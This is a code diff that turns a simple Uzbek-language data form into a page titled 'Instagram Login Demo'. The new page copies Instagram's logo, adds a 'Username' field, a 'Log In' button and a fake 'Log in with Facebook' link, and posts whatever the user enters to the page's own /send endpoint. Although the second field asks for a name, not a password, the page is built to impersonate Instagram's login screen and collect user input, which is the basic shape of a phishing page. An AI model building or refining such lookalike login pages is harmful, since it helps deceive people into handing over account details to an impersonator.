@@ -1,50 +1,72 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ma'lumot Formasi</title>
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login Demo</title>
+
+<!-- Font Awesome for icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h2>Ma'lumot kiriting</h2>
+
+<div class="container">
+    <div class="login-box">
+        <!-- Instagram logo -->
+        <div class="insta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+        </div>
+
         <form id="form">
-            <input type="text" id="ism" placeholder="Ismingiz" required>
-            <input type="number" id="yosh" placeholder="Yoshingiz" required>
-            <button type="submit">Yuborish</button>
+            <input type="text" id="ism" placeholder="Username" required>
+            <input type="text" id="yosh" placeholder="Ismingiz" required>
+            <button type="submit">Log In</button>
         </form>
-        <p id="status"></p>
+
+        <div class="divider">OR</div>
+        <div class="fb-login"><i class="fa-brands fa-facebook-square"></i> Log in with Facebook</div>
+        <p class="status" id="status"></p>
     </div>
 
-    <script>
-    const form = document.getElementById("form");
-    const status = document.getElementById("status");
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
 
-    form.addEventListener("submit", async (e) => {
-        e.preventDefault();
+<script>
+const form = document.getElementById("form");
+const status = document.getElementById("status");
 
-        const ism = document.getElementById("ism").value;
-        const yosh = document.getElementById("yosh").value;
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-        try {
-            const response = await fetch("/send", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ ism, yosh })
-            });
+    const ism = document.getElementById("ism").value;
+    const yosh = document.getElementById("yosh").value;
 
-            if(response.ok){
-                status.textContent = "✅ Ma'lumot yuborildi";
-                form.reset();
-            } else {
-                status.textContent = "❌ Xato yuz berdi";
-            }
-        } catch(err){
-            console.error(err);
+    try {
+        const response = await fetch("/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ism, yosh })
+        });
+
+        if(response.ok){
+            status.style.color = "green";
+            status.textContent = "✅ Ma'lumot yuborildi";
+            form.reset();
+        } else {
+            status.style.color = "red";
             status.textContent = "❌ Xato yuz berdi";
         }
-    });
-    </script>
+    } catch(err){
+        console.error(err);
+        status.style.color = "red";
+        status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
+    }
+});
+</script>
+
 </body>
 </html>
